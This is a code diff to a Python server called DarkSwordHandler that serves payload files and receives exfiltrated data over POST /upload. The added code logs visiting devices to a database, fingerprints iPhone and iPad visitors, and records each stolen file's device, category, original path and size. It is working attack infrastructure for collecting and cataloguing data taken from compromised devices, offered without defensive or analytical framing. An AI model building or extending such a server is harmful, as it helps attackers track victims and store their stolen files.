@@ -13,6 +13,86 @@ from .config import get_payloads_dir, get_templates_dir, ServeConfig
 
 EXFIL_DIR: Optional[Path] = None
 
+try:
+    from admin.database import SessionLocal, Log, Device, ExfilData
+    DB_AVAILABLE = True
+except ImportError:
+    DB_AVAILABLE = False
+
+
+def save_log_to_db(log_type: str, ip: str, method: str = None, path: str = None, 
+                   status_code: int = None, content_length: int = None, user_agent: str = None,
+                   device_uuid: str = None):
+    if not DB_AVAILABLE:
+        return
+    try:
+        db = SessionLocal()
+        log = Log(
+            timestamp=datetime.now(),
+            ip=ip,
+            method=method,
+            path=path,
+            status_code=status_code,
+            content_length=content_length,
+            user_agent=user_agent,
+            log_type=log_type,
+            device_uuid=device_uuid
+        )
+        db.add(log)
+        db.commit()
+        db.close()
+    except Exception:
+        pass
+
+
+def update_device_in_db(device_uuid: str, ip: str, user_agent: str = None):
+    if not DB_AVAILABLE:
+        return
+    try:
+        db = SessionLocal()
+        device = db.query(Device).filter(Device.device_uuid == device_uuid).first()
+        if device:
+            device.last_seen = datetime.now()
+            device.ip = ip
+            if user_agent:
+                device.user_agent = user_agent
+        else:
+            device = Device(
+                device_uuid=device_uuid,
+                first_seen=datetime.now(),
+                last_seen=datetime.now(),
+                ip=ip,
+                user_agent=user_agent,
+                status="active"
+            )
+            db.add(device)
+        db.commit()
+        db.close()
+    except Exception:
+        pass
+
+
+def save_exfil_to_db(device_uuid: str, category: str, path: str, description: str, 
+                     file_path: str, file_size: int):
+    if not DB_AVAILABLE:
+        return
+    try:
+        db = SessionLocal()
+        exfil = ExfilData(
+            device_uuid=device_uuid,
+            category=category,
+            path=path,
+            description=description,
+            file_path=file_path,
+            file_size=file_size,
+            uploaded_at=datetime.now()
+        )
+        db.add(exfil)
+        db.commit()
+        db.close()
+    except Exception:
+        pass
+
 
 def log_to_file(msg: str, log_path: Optional[Path] = None) -> None:
     """Write log message to file."""
@@ -131,9 +211,35 @@ class DarkSwordHandler(SimpleHTTPRequestHandler):
         """Handle GET requests - serve from payloads or templates."""
         parsed = urlparse(self.path)
         client_ip = self.client_address[0] if self.client_address else "unknown"
+        user_agent = self.headers.get("User-Agent", "")
+        
+        device_uuid = None
+        if parsed.query:
+            from urllib.parse import parse_qs
+            params = parse_qs(parsed.query)
+            if 'device' in params:
+                device_uuid = params['device'][0]
+            elif 'uuid' in params:
+                device_uuid = params['uuid'][0]
+            elif 'deviceUUID' in params:
+                device_uuid = params['deviceUUID'][0]
+        
+        if not device_uuid and ('iPhone' in user_agent or 'iPad' in user_agent or 'iOS' in user_agent):
+            import hashlib
+            import uuid
+            hash_input = f"{client_ip}_{user_agent}_{datetime.now().strftime('%Y%m%d')}"
+            device_uuid = hashlib.md5(hash_input.encode()).hexdigest()[:32]
+        
+        if device_uuid:
+            update_device_in_db(device_uuid, client_ip, user_agent)
+        
         request_log = f"GET {self.path} from {client_ip}"
+        if device_uuid:
+            request_log += f" (device: {device_uuid})"
         print(f"  [REQUEST] {request_log}")
         log_to_file(request_log, self.log_path)
+        log_type = "ios" if device_uuid else "request"
+        save_log_to_db(log_type, client_ip, "GET", self.path, user_agent=user_agent, device_uuid=device_uuid)
         
         norm_log = parsed.path.rstrip("/") or "/"
         if norm_log == "/log.html":
@@ -178,17 +284,28 @@ class DarkSwordHandler(SimpleHTTPRequestHandler):
         body = self.rfile.read(content_length) if content_length else b""
         parsed = urlparse(self.path)
         client_ip = self.client_address[0] if self.client_address else "unknown"
+        user_agent = self.headers.get("User-Agent", "")
         
         if parsed.path.strip("/") == "upload":
             request_log = f"POST /upload from {client_ip} ({content_length} bytes)"
             print(f"  [REQUEST] {request_log}")
             log_to_file(request_log, self.log_path)
+            
+            device_uuid = None
+            try:
+                data = json.loads(body.decode("utf-8"))
+                device_uuid = data.get("deviceUUID", None)
+            except:
+                pass
+            
+            save_log_to_db("exfil", client_ip, "POST", "/upload", content_length=content_length, user_agent=user_agent, device_uuid=device_uuid)
             self._handle_upload(body)
             return
         
         request_log = f"POST {self.path} from {client_ip} ({content_length} bytes)"
         print(f"  [POST] {request_log}")
         log_to_file(request_log, self.log_path)
+        save_log_to_db("request", client_ip, "POST", self.path, content_length=content_length, user_agent=user_agent)
         self.send_response(404)
         self.end_headers()
 
@@ -200,6 +317,11 @@ class DarkSwordHandler(SimpleHTTPRequestHandler):
             path = data.get("path", "unknown")
             desc = data.get("description", "")
             b64 = data.get("data", "")
+            client_ip = self.client_address[0] if self.client_address else "unknown"
+            user_agent = self.headers.get("User-Agent", "")
+            
+            update_device_in_db(device, client_ip, user_agent)
+            
             if b64:
                 raw = base64.b64decode(b64)
                 exfil_dir = EXFIL_DIR or (get_payloads_dir().parent / "exfil")
@@ -212,6 +334,7 @@ class DarkSwordHandler(SimpleHTTPRequestHandler):
                 log_str = f"[EXFIL] {device} | {category} | {path} -> {out_path}"
                 print(f"  {log_str}")
                 log_to_file(log_str, self.log_path)
+                save_exfil_to_db(device, category, path, desc, str(out_path), len(raw))
             self.send_response(200)
             self.send_header("Content-Type", "application/json")
             self.end_headers()
